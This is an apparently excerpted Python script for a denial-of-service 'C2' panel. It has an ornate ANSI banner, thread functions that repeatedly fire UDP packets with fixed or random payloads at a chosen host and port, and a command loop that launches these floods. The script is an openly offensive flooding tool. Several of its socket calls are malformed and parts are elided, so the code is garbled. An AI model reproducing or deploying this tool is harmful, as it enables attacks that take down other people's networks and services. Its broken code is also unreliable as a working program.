...
\033[36m                ║\033[37m- - - - - - - ❦𝓜𝓲𝓼𝓼⋆⌬ιvᴀɴxᴘʟuтoɴ C2 By \033[37m@❦𝓜𝓲𝓼𝓼⋆⌬ιvᴀɴxтʀᴀɴsғoʀмᴇʀ C2 \033[37m- - - - - - -\033[36m ║
\033[36m                ║\033[37m  - - - ❦𝓜𝓲𝓼𝓼⋆⌬тʏᴘᴇ \033[37m❦𝓜𝓲𝓼𝓼⋆⌬нᴇʟᴘ\033[37m ❦𝓜𝓲𝓼𝓼⋆⌬тo sᴇᴇ тнᴇ Hᴇʟᴘ Mᴇɴu - - -\033[36m   ║
\033[36m                ╚═\x1b[38;2;0;212;14m═════════════════════════\x1b[38;2;0;186;45m════\x1b[38;2;0;83;168m═════════════════╝
\033[36m                ╔══\x1b[38;2;0;212;14m══════════════\x1b[38;2;0;186;45m═════════\x1b[38;2;0;83;168m══════════════════════╗
\033[36m                ╚══\x1b[38;2;0;212;14m══════════════\x1b[38;2;0;186;45m════════════\x1b[38;2;0;83;168m═══════════════════╝
\033[36m                 ╔═\x1b[38;2;0;212;14m════════════\x1b[38;2;0;186;45m═════════\x1b[38;2;0;83;168m═════════════════════╗
\033[36m                 ║\033[36m-      - - - ❦𝓜𝓲𝓼𝓼⋆⌬𝑪𝒐𝒏𝒏𝒆𝒄𝒕𝒊𝒐𝒏 𝑯𝒂𝒔 𝑩𝒆𝒆𝒏 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 𝑨𝑷𝑰 𝑯𝒂𝒔 𝑩𝒆𝒆𝒏 [𝑶𝒏𝒍𝒊𝒏𝒆] \033[37m[24/02/2024]║- - -
\033[36m                 ║\033[36m-      - - -  ❦𝓜𝓲𝓼𝓼⋆⌬Tⓔⓛⓔⓖⓡⓐⓜ :  \033[37m @❦𝓜𝓲𝓼𝓼⋆⌬𝑰𝒗𝒂𝒏𝓟𝓮𝓽𝓮𝓻 \033[36m- - -║
\033[36m                 ║\033[36m-      - - -  ❦𝓜𝓲𝓼𝓼⋆⌬ⓘⓝⓢⓣⓐⓖⓡⓐⓜ :  \033[37m @❦𝓜𝓲𝓼𝓼⋆⌬𝑰𝒗𝒂𝒏𝓟𝓮𝓽𝓮𝓻 \033[36m- - -║
\033[36m                 ║\033[36m-      - - -  ❦𝓜𝓲𝓼𝓼⋆⌬ⓓⓘⓢ©ⓞⓡⓓ :  \033[37m #❦𝓜𝓲𝓼𝓼⋆⌬𝑰𝒗𝒂𝒏𝓟𝓮𝓽𝓮𝓻 \033[36m- - -║
\033[36m                 ║\033[36m-      - - -  ❦𝓜𝓲𝓼𝓼⋆⌬ⓨⓞⓤⓣⓤⓑⓔ :  \033[37m @❦𝓜𝓲𝓼𝓼⋆⌬𝑰𝒗𝒂𝒏𝓟𝓮𝓽𝓮𝓻 \033[36m- - -║
\033[36m                 ║\033[36m-      - - - ❦𝓜𝓲𝓼𝓼⋆⌬𝑪𝒐𝒏𝒏𝒆𝒄𝒕𝒊𝒐𝒏 𝑯𝒂𝒔 𝑩𝒆𝒆𝒏 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 𝑨𝑷𝑰 𝑯𝒂𝒔 𝑩𝒆𝒆𝒏 [𝑶𝒏𝒍𝒊𝒏𝒆] \033[37m[24/02/2024]║- - -
\033[36m                 ╚═\x1b[38;2;0;212;14m═════════════════════════\x1b[38;2;0;186;45m════\x1b[38;2;0;83;168m═════════════╝
...
def randsender(host, timer, port, punch, payload, threads):
	global iaid
	global aid
	global tattacks
	global running
	...
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch,payload,threads (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1
...
def stdsender(host, port, timer, payload, threads):
	global atks
	global running
	...
	while time.time() < timeout and attack:
		sock.sendto(payload,threads (host, int(port)))
		sock.sendto(payload,threads (host, int(port)))
		sock.sendto(payload,threads (host, int(port)))
		sock.sendto(payload,threads (host, int(port)))
		sock.sendto(payload,threads (host, int(port)))
...
def main():
	...
	while True:
		powerran = (random.randint(32500,65337))
		...
		sin = input("\033[0;36m{}\033[0;34m@[root]\033[36m--> \033[0;31m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("cls")
			print (banner)
		...
		if sinput == "cls":
			...
			try:
				if running >= 20000:
					...
					sinput, host, timer, port, threads, payload = sin.split(" ")
					socket.gethostbyname(host, timer, port, threads, payload)
					payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload, threads)).start()
			except ValueError:
				main()
			...
			try:
				if running >= 20000:
					...
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch, payload, threads)).start()
					os.system('cls')
					print("\x1b[38;2;0;212;14m[-] has sent packets to the server using a \x1b[38;2;0;186;45mTransformer X Bumblebee.")
					time.sleep(1)
					os.system('cls')
